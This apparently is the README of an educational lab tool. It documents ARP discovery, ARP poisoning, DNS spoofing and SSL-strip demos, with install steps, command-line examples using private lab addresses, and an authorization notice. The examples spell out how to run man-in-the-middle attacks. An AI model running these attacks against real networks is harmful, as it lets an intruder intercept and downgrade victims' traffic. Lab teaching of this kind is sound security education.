# Educational ARP & DNS Manipulation Tool

This project provides a controlled environment to study ARP and DNS weaknesses inside an **authorized lab network** (e.g., host-only or isolated NAT). It is for **education only**.

Implemented demos:
- `discover` — ARP network discovery
- `arp-demo` — bidirectional ARP poisoning with forwarding
- `dns-demo` — DNS spoofing for a target domain
- `ssl-strip` — HTTPS listener that 301-redirects to HTTP

---

## Requirements

- Kali Linux recommended (other Linux may work)
- Python 3.8+
- System packages (Kali):
  ```
  sudo apt update && sudo apt upgrade -y
  sudo apt install -y python3 python3-pip python3-venv tcpdump libpcap-dev
  ```
- Python deps:
  ```
  pip install scapy
  ```

---

## Installation

```bash
cd educational_arp_dns_tool
python3 -m venv .venv
source .venv/bin/activate
pip install --upgrade pip
pip install scapy
```

---

## Running the CLI

Run with sudo/root for packet features:

```bash
sudo python3 -m tool.cli --help
```

Subcommands:
```
discover   # ARP sweep of a CIDR
arp-demo   # ARP poison two targets and forward
dns-demo   # DNS spoof a target domain
ssl-strip  # HTTPS redirector to HTTP
```

---

## Examples

### Discover
```bash
sudo python3 -m tool.cli discover -r 192.168.178.0/24
```

### ARP poisoning demo
```bash
sudo python3 -m tool.cli arp-demo 192.168.178.10 192.168.178.1 -I eth0 -c 5 -i 1
```
- `-I` interface; `-c` initial poison bursts; `-i` interval while running.

### DNS spoofing demo
```bash
sudo python3 -m tool.cli dns-demo example.com -s 192.168.178.76 -I eth0
```
- Add `-v <victim-ip>` to only spoof one host.

### SSL strip demo (lab hostname)
```bash
# attacker terminal 1: plain HTTP target
sudo python3 -m http.server 80

# attacker terminal 2: SSL redirector
sudo python -m tool.cli ssl-strip demo.local -b 192.168.178.76 -I eth0

# victim: map hostname to attacker IP
echo "192.168.178.76 demo.local" | sudo tee -a /etc/hosts
```
Browse to `https://demo.local` from the victim, accept the cert warning, and you should be redirected to `http://demo.local`. HSTS-preloaded sites (e.g., google.com, example.com) will not downgrade.

---

## Ethical Notice

Use only on networks you own or where you have explicit written permission. Running ARP/DNS manipulation on unauthorized networks is illegal and unethical. This project exists for educational purposes aligned with defensive security learning.
